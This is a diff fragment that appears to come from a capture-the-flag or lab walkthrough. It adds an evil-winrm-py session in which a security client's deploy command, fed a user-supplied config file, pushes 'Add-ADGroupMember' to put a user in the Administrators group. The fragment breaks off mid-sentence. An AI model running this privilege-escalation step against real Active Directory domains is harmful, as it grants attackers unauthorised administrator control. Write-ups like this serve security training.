@@ -1275,5 +1275,32 @@ Add-ADGroupMember -Identity 'Administrators' -Members 'CN=Bertrand Trask,OU=Staf
 This shows me what it will run
 
 ```python
-
+evil-winrm-py PS C:\Program Files\SentinelSecurity.Client> .\SentinelSecurity.Client.exe deploy --config 'C:\U
+sers\b.trask\Desktop\config.xml' -o
+*****************************************************************
+     _______                                                     
+   _/       \_     ____  _____ _   _ _____ ___ _   _ _____ _     
+  / |       | \   / ___|| ____| \ | |_   _|_ _| \ | | ____| |    
+ /  |__   __|  \  \___ \|  _| |  \| | | |  | ||  \| |  _| | |    
+|__/((o| |o))\__|  ___) | |___| |\  | | |  | || |\  | |___| |___ 
+|      | |      | |____/|_____|_|_\_| |_| |___|_|_\_|_____|_____|
+|\     |_|     /| / ___|| ____/ ___| | | |  _ \|_ _|_   _\ \ / / 
+| \           / | \___ \|  _|| |   | | | | |_) || |  | |  \ V /  
+ \| /  ___  \ |/   ___) | |__| |___| |_| |  _ < | |  | |   | |   
+  \ | / _ \ | /   |____/|_____\____|\___/|_| \_\___| |_|   |_|   
+   \_________/                                                   
+*****************************************************************
+*************************Hello Dr. Trask*************************
+************Secure temporary accounts for your team.*************
+****************STATUS: Testing user templates.******************
+Secure channel opened!
+Deploying the updated configuration to available Sentinel units.
+These commands were sent to the Sentinel network:
+Add-ADGroupMember -Identity 'Administrators' -Members 'CN=Bertrand Trask,OU=Staff,DC=trask,DC=hsm'
+Activating the Sentinel Action Policy...
+Secure channel opened!
+Warning: Could not verify policy status after deployment.
+evil-winrm-py PS C:\Program Files\SentinelSecurity.Client>
 ```
+
+Then using `-o` 
